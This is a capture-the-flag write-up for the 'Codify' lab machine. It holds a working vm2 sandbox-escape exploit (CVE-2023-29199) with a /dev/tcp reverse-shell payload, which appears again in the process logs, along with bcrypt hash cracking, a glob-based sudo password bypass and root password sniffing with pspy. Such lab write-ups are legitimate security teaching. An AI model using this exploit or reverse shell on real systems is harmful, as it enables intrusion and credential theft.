# CTF Writeup: Codify

## Lab Description

Codify is an easy Linux machine that features a web application that allows users to test `Node.js` code. The application uses a vulnerable `vm2` library, which is leveraged to gain remote code execution. Enumerating the target reveals a `SQLite` database containing a hash which, once cracked, yields `SSH` access to the box. Finally, a vulnerable `Bash` script can be run with elevated privileges to reveal the `root` user&amp;#039;s password, leading to privileged access to the machine. 

---

## Reconaissance


An initial service enumeration scan provides us with the following information:

```
nmap -A -p- --min-rate 10000 10.129.49.246
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-24 17:48 EDT
Nmap scan report for 10.129.49.246
Host is up (0.018s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://codify.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
|_http-title: Codify
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5
OS details: Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: Host: codify.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3306/tcp)
HOP RTT      ADDRESS
1   14.94 ms 10.10.14.1
2   15.05 ms 10.129.49.246

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.26 seconds
```

Let's first map the domain codify.htb to our target ip in our local dns file /etc/hosts

```
sudo echo "10.129.49.246 codify.htb" | sudo tee -a /etc/hosts
```

Analyzing the webpage we retrieve information about an "vm library" and an link on it. Clicking on the link we are forwarded to an github installation repo, in which we can retrieve the vm library version 3.9.16

```
https://github.com/patriksimek/vm2/releases/tag/3.9.16
```

## Vulnerability Assessment

Searching up on google for CVE's for VM2 JS Library 3.9.16
Found CVE-2023-29199 --> RCE for Version 3.9.16

Will utilize following PoC

```
wget https://raw.githubusercontent.com/jakabakos/vm2-sandbox-escape-exploits/refs/heads/master/CVE-2023-29199.js
```

Modified the PoC & added my rev shell connection inside it. Final PoC should look like this:


```
// Import the VM class from the vm2 module to create an isolated virtual environment.
const { VM } = require("vm2");
const vm = new VM(); // Initialize a new VM instance for executing code securely.

// Define JavaScript code to be executed within the VM, demonstrating the CVE-2023-29199 vulnerability.
const code = `
  // Set up an identifier expected to be replaced during post-processing.
  aVM2_INTERNAL_TMPNAME = {};

  // Function to intentionally cause a stack overflow, simulating a host exception.
  function stack() {
    new Error().stack; // Access the stack trace, contributing to stack overflow.
    stack(); // Recursive call to self, ensures continuous execution until stack overflow.
  }

  // Attempt to execute the recursive function in a try block.
  try {
    stack(); // This call will eventually throw an error due to stack overflow.
  } catch (a$tmpname) { // Catch the error, the identifier 'a$tmpname' is crucial.
    // Exploit the caught exception object to execute arbitrary code on the host.
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('/bin/bash -c "bash -i >& /dev/tcp/10.10.14.186/1337 0>&1"');
    // 'constructor.constructor' accesses the Function constructor allowing execution of arbitrary JavaScript.
  }
`

// Execute the malicious code within the VM and log any output.
console.log(vm.run(code)); // Output from executing the code, e.g., errors or return values from 'execSync'.

```


## Initial Access


Started up my listener on port 1337


```
nc -lvnp 1337
```

Pasted the source code of our exploit into the editor functionality inside the webpage and gained RCE on the target server.

Users on the target server

```
svc@codify:~$ cat /etc/passwd | grep /bin/bash
cat /etc/passwd | grep /bin/bash
root:x:0:0:root:/root:/bin/bash
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

Found credentials / encoded password of user joshua in /var/www/contact/tickets.db

```
svc@codify:/var/www/contact$ cat tickets.db
cat tickets.db
�T5��T�format 3@  .WJ
       otableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)��    tableusersusersCREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        username TEXT UNIQUE, 
        password TEXT
��G�joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
��
����ua  users
             ickets
r]r�h%%�Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open� ;�wTom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open
```

joshua:$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

Let's try and bruteforce an password utilizing john the ripper & rockyou.txt

```
john password.hash --wordlist=/usr/share/wordlists/rockyou.txt                
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:00:33 DONE (2025-10-24 18:17) 0.03027g/s 41.41p/s 41.41c/s 41.41C/s winston..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Gained credentials joshua:spongebob1

Logged into joshua using ssh.

```
ssh joshua@codify.htb                                             
The authenticity of host 'codify.htb (10.129.49.246)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'codify.htb' (ED25519) to the list of known hosts.
joshua@codify.htb's password: 
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Oct 24 10:19:03 PM UTC 2025

  System load:                      0.05615234375
  Usage of /:                       69.8% of 6.50GB
  Memory usage:                     19%
  Swap usage:                       0%
  Processes:                        239
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.49.246
  IPv6 address for eth0:            dead:beef::250:56ff:fe94:73ee


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23
joshua@codify:~$
```

Retrieved user.txt in /home/joshua directory.


```
1290bd938c4731e48db1cb76eb74813f
```


## Privilege Escalation


Running sudo -l reveals that user joshua is able to run mysql-backup.sh script with root rights without authentication.

```
joshua@codify:~$ sudo -l
Matching Defaults entries for joshua on codify:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User joshua may run the following commands on codify:
    (root) /opt/scripts/mysql-backup.sh
```

Within this script, there is an misconfig. In the password comparison, it actually doesn't check for matching strings, it checks for pattern matching (since it's an bash script). If we prompt * for the password, the pattern match will be evaluated as true, because * operator matches any string.

```
sudo /opt/scripts/mysql-backup.sh
Enter MySQL password for root: *

Password confirmed!
mysql: [Warning] Using a password on the command line interface can be insecure.
Backing up database: mysql
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
mysqldump: Got error: 1556: You can't use locks with log tables when using LOCK TABLES
Backing up database: sys
mysqldump: [Warning] Using a password on the command line interface can be insecure.
-- Warning: column statistics not supported by the server.
All databases backed up successfully!
Changing the permissions
Done!
```

There is another bypass or misconfig within the script, how the password variable is getting passed to mysqldump. It's the actual password of the root user specified in /root/.creds. This means that if we bypass the password check (which we can) we not only able to run the whole script, but also view the admin password by using a process sniffing tool.
We can utilize an tool called "psspy" in order to track all the processes which are getting executed in the backend and also potentially retrieve the root password. In order for this to work, we will need to install psspy & create a 2nd ssh session.


Downloaded the pspy64s binary from the following url on my local machine.

```
https://github.com/DominicBreuker/pspy/releases/tag/v1.2.1
```

Launched my python server, in which I saved the pspy binary file.

```
python3 -m http.server 80
```

Logged into 2nd ssh session using user "joshua" and downloaded my binary.

```
wget http://10.10.14.186/pspy64s
```

Gave the binary executable rights.

```
chmod +x pspy64s
```

Ran the script

```
./pspy64s
```

```
joshua@codify:~$ ./pspy64s 
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/10/25 00:06:02 CMD: UID=1000  PID=2600   | ./pspy64s 
2025/10/25 00:06:02 CMD: UID=1000  PID=2548   | -bash 
2025/10/25 00:06:02 CMD: UID=1000  PID=2547   | sshd: joshua@pts/2   
2025/10/25 00:06:02 CMD: UID=0     PID=2448   | sshd: joshua [priv]  
2025/10/25 00:06:02 CMD: UID=0     PID=2430   | 
2025/10/25 00:06:02 CMD: UID=33    PID=2382   | /usr/sbin/apache2 -k start 
2025/10/25 00:06:02 CMD: UID=33    PID=2351   | /usr/sbin/apache2 -k start 
2025/10/25 00:06:02 CMD: UID=0     PID=2284   | 
2025/10/25 00:06:02 CMD: UID=0     PID=2277   | 
2025/10/25 00:06:02 CMD: UID=0     PID=2274   | 
2025/10/25 00:06:02 CMD: UID=0     PID=2248   | 
2025/10/25 00:06:02 CMD: UID=0     PID=2218   | 
2025/10/25 00:06:02 CMD: UID=0     PID=2216   | 
2025/10/25 00:06:02 CMD: UID=1000  PID=2027   | -bash 
2025/10/25 00:06:02 CMD: UID=1000  PID=2026   | sshd: joshua@pts/1   
2025/10/25 00:06:02 CMD: UID=0     PID=1927   | sshd: joshua [priv]  
2025/10/25 00:06:02 CMD: UID=1000  PID=1920   | /bin/bash 
2025/10/25 00:06:02 CMD: UID=1000  PID=1919   | python3 -c import pty;pty.spawn("/bin/bash") 
2025/10/25 00:06:02 CMD: UID=1000  PID=1917   | bash 
2025/10/25 00:06:02 CMD: UID=1000  PID=1910   | (sd-pam) 
2025/10/25 00:06:02 CMD: UID=1000  PID=1909   | /lib/systemd/systemd --user 
2025/10/25 00:06:02 CMD: UID=0     PID=1907   | su joshua 
2025/10/25 00:06:02 CMD: UID=1001  PID=1829   | bash -i 
2025/10/25 00:06:02 CMD: UID=1001  PID=1828   | /bin/bash -c bash -i >& /dev/tcp/10.10.14.186/1337 0>&1 
2025/10/25 00:06:02 CMD: UID=1001  PID=1827   | /bin/sh -c /bin/bash -c "bash -i >& /dev/tcp/10.10.14.186/1337 0>&1"                                                                                                            
2025/10/25 00:06:02 CMD: UID=999   PID=1680   | mariadbd 
2025/10/25 00:06:02 CMD: UID=0     PID=1655   | /usr/bin/containerd-shim-runc-v2 -namespace moby -id f88b314ed6a4f84693267bda194d6266bdde5798ef5ccd082109b2566fda07f8 -address /run/containerd/containerd.sock                  
2025/10/25 00:06:02 CMD: UID=0     PID=1638   | /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3306 -container-ip 172.19.0.2 -container-port 3306                                                               
2025/10/25 00:06:02 CMD: UID=1001  PID=1553   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=0     PID=1552   | /usr/bin/python3 /usr/bin/docker-compose -f /root/scripts/docker/docker-compose.yml up                                                                                          
2025/10/25 00:06:02 CMD: UID=0     PID=1551   | /bin/sh /root/scripts/other/docker-startup.sh 
2025/10/25 00:06:02 CMD: UID=1001  PID=1550   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1509   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1496   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1476   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1453   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1430   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1426   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1399   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1395   | node /var/www/editor/index.js                                                                                                                                                   
2025/10/25 00:06:02 CMD: UID=1001  PID=1250   | PM2 v5.3.0: God Daemon (/home/svc/.pm2)            
2025/10/25 00:06:02 CMD: UID=0     PID=1238   | /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock                                                                                                          
2025/10/25 00:06:02 CMD: UID=0     PID=1173   | /usr/sbin/apache2 -k start 
2025/10/25 00:06:02 CMD: UID=0     PID=1163   | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/10/25 00:06:02 CMD: UID=0     PID=1157   | /sbin/agetty -o -p -- \u --noclear tty1 linux 
2025/10/25 00:06:02 CMD: UID=0     PID=1145   | /usr/bin/containerd 
2025/10/25 00:06:02 CMD: UID=0     PID=1133   | /usr/sbin/cron -f -P 
2025/10/25 00:06:02 CMD: UID=0     PID=863    | /usr/sbin/ModemManager 
2025/10/25 00:06:02 CMD: UID=0     PID=837    | /usr/libexec/udisks2/udisksd 
2025/10/25 00:06:02 CMD: UID=0     PID=836    | /lib/systemd/systemd-logind 
2025/10/25 00:06:02 CMD: UID=107   PID=835    | /usr/sbin/rsyslogd -n -iNONE 
2025/10/25 00:06:02 CMD: UID=0     PID=834    | /usr/libexec/polkitd --no-debug 
2025/10/25 00:06:02 CMD: UID=0     PID=833    | /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers                                                                                                            
2025/10/25 00:06:02 CMD: UID=0     PID=832    | /usr/sbin/irqbalance --foreground 
2025/10/25 00:06:02 CMD: UID=103   PID=823    | @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                
2025/10/25 00:06:02 CMD: UID=0     PID=728    | /sbin/dhclient -1 -4 -v -i -pf /run/dhclient.eth0.pid -lf /var/lib/dhcp/dhclient.eth0.leases -I -df /var/lib/dhcp/dhclient6.eth0.leases eth0                                    
2025/10/25 00:06:02 CMD: UID=0     PID=714    | /usr/bin/vmtoolsd 
2025/10/25 00:06:02 CMD: UID=0     PID=711    | /usr/bin/VGAuthService 
2025/10/25 00:06:02 CMD: UID=998   PID=699    | /usr/local/sbin/laurel --config /etc/laurel/config.toml 
2025/10/25 00:06:02 CMD: UID=0     PID=696    | /sbin/auditd 
2025/10/25 00:06:02 CMD: UID=104   PID=688    | /lib/systemd/systemd-timesyncd 
2025/10/25 00:06:02 CMD: UID=102   PID=687    | /lib/systemd/systemd-resolved 
2025/10/25 00:06:02 CMD: UID=0     PID=658    | 
2025/10/25 00:06:02 CMD: UID=0     PID=657    | 
2025/10/25 00:06:02 CMD: UID=101   PID=586    | /lib/systemd/systemd-networkd 
2025/10/25 00:06:02 CMD: UID=0     PID=554    | /lib/systemd/systemd-udevd 
2025/10/25 00:06:02 CMD: UID=0     PID=549    | /sbin/multipathd -d -s 
2025/10/25 00:06:02 CMD: UID=0     PID=548    | 
2025/10/25 00:06:02 CMD: UID=0     PID=547    | 
2025/10/25 00:06:02 CMD: UID=0     PID=545    | 
2025/10/25 00:06:02 CMD: UID=0     PID=541    | 
2025/10/25 00:06:02 CMD: UID=0     PID=513    | /lib/systemd/systemd-journald 
2025/10/25 00:06:02 CMD: UID=0     PID=456    | 
2025/10/25 00:06:02 CMD: UID=0     PID=455    | 
2025/10/25 00:06:02 CMD: UID=0     PID=397    | 
2025/10/25 00:06:02 CMD: UID=0     PID=366    | 
2025/10/25 00:06:02 CMD: UID=0     PID=364    | 
2025/10/25 00:06:02 CMD: UID=0     PID=341    | 
2025/10/25 00:06:02 CMD: UID=0     PID=340    | 
2025/10/25 00:06:02 CMD: UID=0     PID=313    | 
2025/10/25 00:06:02 CMD: UID=0     PID=312    | 
2025/10/25 00:06:02 CMD: UID=0     PID=311    | 
2025/10/25 00:06:02 CMD: UID=0     PID=310    | 
2025/10/25 00:06:02 CMD: UID=0     PID=309    | 
2025/10/25 00:06:02 CMD: UID=0     PID=308    | 
2025/10/25 00:06:02 CMD: UID=0     PID=307    | 
2025/10/25 00:06:02 CMD: UID=0     PID=306    | 
2025/10/25 00:06:02 CMD: UID=0     PID=304    | 
2025/10/25 00:06:02 CMD: UID=0     PID=303    | 
2025/10/25 00:06:02 CMD: UID=0     PID=302    | 
2025/10/25 00:06:02 CMD: UID=0     PID=301    | 
2025/10/25 00:06:02 CMD: UID=0     PID=300    | 
2025/10/25 00:06:02 CMD: UID=0     PID=294    | 
2025/10/25 00:06:02 CMD: UID=0     PID=292    | 
2025/10/25 00:06:02 CMD: UID=0     PID=291    | 
2025/10/25 00:06:02 CMD: UID=0     PID=290    | 
2025/10/25 00:06:02 CMD: UID=0     PID=289    | 
2025/10/25 00:06:02 CMD: UID=0     PID=288    | 
2025/10/25 00:06:02 CMD: UID=0     PID=287    | 
2025/10/25 00:06:02 CMD: UID=0     PID=286    | 
2025/10/25 00:06:02 CMD: UID=0     PID=285    | 
2025/10/25 00:06:02 CMD: UID=0     PID=284    | 
2025/10/25 00:06:02 CMD: UID=0     PID=283    | 
2025/10/25 00:06:02 CMD: UID=0     PID=282    | 
2025/10/25 00:06:02 CMD: UID=0     PID=281    | 
2025/10/25 00:06:02 CMD: UID=0     PID=280    | 
2025/10/25 00:06:02 CMD: UID=0     PID=279    | 
2025/10/25 00:06:02 CMD: UID=0     PID=278    | 
2025/10/25 00:06:02 CMD: UID=0     PID=277    | 
2025/10/25 00:06:02 CMD: UID=0     PID=276    | 
2025/10/25 00:06:02 CMD: UID=0     PID=275    | 
2025/10/25 00:06:02 CMD: UID=0     PID=262    | 
2025/10/25 00:06:02 CMD: UID=0     PID=254    | 
2025/10/25 00:06:02 CMD: UID=0     PID=253    | 
2025/10/25 00:06:02 CMD: UID=0     PID=245    | 
2025/10/25 00:06:02 CMD: UID=0     PID=243    | 
2025/10/25 00:06:02 CMD: UID=0     PID=236    | 
2025/10/25 00:06:02 CMD: UID=0     PID=234    | 
2025/10/25 00:06:02 CMD: UID=0     PID=233    | 
2025/10/25 00:06:02 CMD: UID=0     PID=232    | 
2025/10/25 00:06:02 CMD: UID=0     PID=231    | 
2025/10/25 00:06:02 CMD: UID=0     PID=230    | 
2025/10/25 00:06:02 CMD: UID=0     PID=229    | 
2025/10/25 00:06:02 CMD: UID=0     PID=228    | 
2025/10/25 00:06:02 CMD: UID=0     PID=227    | 
2025/10/25 00:06:02 CMD: UID=0     PID=226    | 
2025/10/25 00:06:02 CMD: UID=0     PID=225    | 
2025/10/25 00:06:02 CMD: UID=0     PID=224    | 
2025/10/25 00:06:02 CMD: UID=0     PID=223    | 
2025/10/25 00:06:02 CMD: UID=0     PID=222    | 
2025/10/25 00:06:02 CMD: UID=0     PID=221    | 
2025/10/25 00:06:02 CMD: UID=0     PID=220    | 
2025/10/25 00:06:02 CMD: UID=0     PID=219    | 
2025/10/25 00:06:02 CMD: UID=0     PID=218    | 
2025/10/25 00:06:02 CMD: UID=0     PID=217    | 
2025/10/25 00:06:02 CMD: UID=0     PID=216    | 
2025/10/25 00:06:02 CMD: UID=0     PID=215    | 
2025/10/25 00:06:02 CMD: UID=0     PID=214    | 
2025/10/25 00:06:02 CMD: UID=0     PID=213    | 
2025/10/25 00:06:02 CMD: UID=0     PID=212    | 
2025/10/25 00:06:02 CMD: UID=0     PID=211    | 
2025/10/25 00:06:02 CMD: UID=0     PID=210    | 
2025/10/25 00:06:02 CMD: UID=0     PID=209    | 
2025/10/25 00:06:02 CMD: UID=0     PID=208    | 
2025/10/25 00:06:02 CMD: UID=0     PID=207    | 
2025/10/25 00:06:02 CMD: UID=0     PID=206    | 
2025/10/25 00:06:02 CMD: UID=0     PID=205    | 
2025/10/25 00:06:02 CMD: UID=0     PID=204    | 
2025/10/25 00:06:02 CMD: UID=0     PID=203    | 
2025/10/25 00:06:02 CMD: UID=0     PID=202    | 
2025/10/25 00:06:02 CMD: UID=0     PID=201    | 
2025/10/25 00:06:02 CMD: UID=0     PID=200    | 
2025/10/25 00:06:02 CMD: UID=0     PID=183    | 
2025/10/25 00:06:02 CMD: UID=0     PID=160    | 
2025/10/25 00:06:02 CMD: UID=0     PID=155    | 
2025/10/25 00:06:02 CMD: UID=0     PID=153    | 
2025/10/25 00:06:02 CMD: UID=0     PID=150    | 
2025/10/25 00:06:02 CMD: UID=0     PID=138    | 
2025/10/25 00:06:02 CMD: UID=0     PID=137    | 
2025/10/25 00:06:02 CMD: UID=0     PID=136    | 
2025/10/25 00:06:02 CMD: UID=0     PID=134    | 
2025/10/25 00:06:02 CMD: UID=0     PID=133    | 
2025/10/25 00:06:02 CMD: UID=0     PID=132    | 
2025/10/25 00:06:02 CMD: UID=0     PID=131    | 
2025/10/25 00:06:02 CMD: UID=0     PID=129    | 
2025/10/25 00:06:02 CMD: UID=0     PID=128    | 
2025/10/25 00:06:02 CMD: UID=0     PID=127    | 
2025/10/25 00:06:02 CMD: UID=0     PID=126    | 
2025/10/25 00:06:02 CMD: UID=0     PID=125    | 
2025/10/25 00:06:02 CMD: UID=0     PID=124    | 
2025/10/25 00:06:02 CMD: UID=0     PID=123    | 
2025/10/25 00:06:02 CMD: UID=0     PID=122    | 
2025/10/25 00:06:02 CMD: UID=0     PID=121    | 
2025/10/25 00:06:02 CMD: UID=0     PID=120    | 
2025/10/25 00:06:02 CMD: UID=0     PID=119    | 
2025/10/25 00:06:02 CMD: UID=0     PID=118    | 
2025/10/25 00:06:02 CMD: UID=0     PID=117    | 
2025/10/25 00:06:02 CMD: UID=0     PID=116    | 
2025/10/25 00:06:02 CMD: UID=0     PID=115    | 
2025/10/25 00:06:02 CMD: UID=0     PID=114    | 
2025/10/25 00:06:02 CMD: UID=0     PID=113    | 
2025/10/25 00:06:02 CMD: UID=0     PID=112    | 
2025/10/25 00:06:02 CMD: UID=0     PID=111    | 
2025/10/25 00:06:02 CMD: UID=0     PID=110    | 
2025/10/25 00:06:02 CMD: UID=0     PID=109    | 
2025/10/25 00:06:02 CMD: UID=0     PID=108    | 
2025/10/25 00:06:02 CMD: UID=0     PID=107    | 
2025/10/25 00:06:02 CMD: UID=0     PID=106    | 
2025/10/25 00:06:02 CMD: UID=0     PID=105    | 
2025/10/25 00:06:02 CMD: UID=0     PID=104    | 
2025/10/25 00:06:02 CMD: UID=0     PID=103    | 
2025/10/25 00:06:02 CMD: UID=0     PID=102    | 
2025/10/25 00:06:02 CMD: UID=0     PID=101    | 
2025/10/25 00:06:02 CMD: UID=0     PID=100    | 
2025/10/25 00:06:02 CMD: UID=0     PID=99     | 
2025/10/25 00:06:02 CMD: UID=0     PID=98     | 
2025/10/25 00:06:02 CMD: UID=0     PID=97     | 
2025/10/25 00:06:02 CMD: UID=0     PID=96     | 
2025/10/25 00:06:02 CMD: UID=0     PID=94     | 
2025/10/25 00:06:02 CMD: UID=0     PID=93     | 
2025/10/25 00:06:02 CMD: UID=0     PID=91     | 
2025/10/25 00:06:02 CMD: UID=0     PID=89     | 
2025/10/25 00:06:02 CMD: UID=0     PID=88     | 
2025/10/25 00:06:02 CMD: UID=0     PID=87     | 
2025/10/25 00:06:02 CMD: UID=0     PID=86     | 
2025/10/25 00:06:02 CMD: UID=0     PID=85     | 
2025/10/25 00:06:02 CMD: UID=0     PID=84     | 
2025/10/25 00:06:02 CMD: UID=0     PID=83     | 
2025/10/25 00:06:02 CMD: UID=0     PID=82     | 
2025/10/25 00:06:02 CMD: UID=0     PID=81     | 
2025/10/25 00:06:02 CMD: UID=0     PID=34     | 
2025/10/25 00:06:02 CMD: UID=0     PID=33     | 
2025/10/25 00:06:02 CMD: UID=0     PID=32     | 
2025/10/25 00:06:02 CMD: UID=0     PID=31     | 
2025/10/25 00:06:02 CMD: UID=0     PID=30     | 
2025/10/25 00:06:02 CMD: UID=0     PID=29     | 
2025/10/25 00:06:02 CMD: UID=0     PID=27     | 
2025/10/25 00:06:02 CMD: UID=0     PID=26     | 
2025/10/25 00:06:02 CMD: UID=0     PID=25     | 
2025/10/25 00:06:02 CMD: UID=0     PID=24     | 
2025/10/25 00:06:02 CMD: UID=0     PID=22     | 
2025/10/25 00:06:02 CMD: UID=0     PID=21     | 
2025/10/25 00:06:02 CMD: UID=0     PID=20     | 
2025/10/25 00:06:02 CMD: UID=0     PID=19     | 
2025/10/25 00:06:02 CMD: UID=0     PID=18     | 
2025/10/25 00:06:02 CMD: UID=0     PID=16     | 
2025/10/25 00:06:02 CMD: UID=0     PID=15     | 
2025/10/25 00:06:02 CMD: UID=0     PID=14     | 
2025/10/25 00:06:02 CMD: UID=0     PID=13     | 
2025/10/25 00:06:02 CMD: UID=0     PID=12     | 
2025/10/25 00:06:02 CMD: UID=0     PID=11     | 
2025/10/25 00:06:02 CMD: UID=0     PID=10     | 
2025/10/25 00:06:02 CMD: UID=0     PID=8      | 
2025/10/25 00:06:02 CMD: UID=0     PID=6      | 
2025/10/25 00:06:02 CMD: UID=0     PID=5      | 
2025/10/25 00:06:02 CMD: UID=0     PID=4      | 
2025/10/25 00:06:02 CMD: UID=0     PID=3      | 
2025/10/25 00:06:02 CMD: UID=0     PID=2      | 
2025/10/25 00:06:02 CMD: UID=0     PID=1      | /sbin/init 
2025/10/25 00:06:06 CMD: UID=0     PID=2608   | sudo /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:06 CMD: UID=0     PID=2611   | 
2025/10/25 00:06:06 CMD: UID=0     PID=2610   | sudo /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:06 CMD: UID=0     PID=2612   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2613   | /usr/bin/echo 
2025/10/25 00:06:08 CMD: UID=0     PID=2614   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2615   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2616   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2618   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2617   | /usr/bin/mysql -u root -h 0.0.0.0 -P 3306 -pkljh12k3jhaskjh12kjh3 -e SHOW DATABASES;                                                                                            
2025/10/25 00:06:08 CMD: UID=0     PID=2620   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2621   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2622   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2623   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2625   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:08 CMD: UID=0     PID=2624   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:09 CMD: UID=0     PID=2626   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:09 CMD: UID=0     PID=2627   | /usr/bin/echo Changing the permissions 
2025/10/25 00:06:09 CMD: UID=0     PID=2628   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:09 CMD: UID=0     PID=2629   | /bin/bash /opt/scripts/mysql-backup.sh 
2025/10/25 00:06:09 CMD: UID=0     PID=2630   | /bin/bash /opt/scripts/mysql-backup.sh
```


Retrieved root password and logged in as user root. root:kljh12k3jhaskjh12kjh3

```
joshua@codify:~$ su -
Password: 
root@codify:~#
```

Retrieved root.txt in /root directory.

```
6deb15dfaa2fa53c7e0ddd13aa965400
```
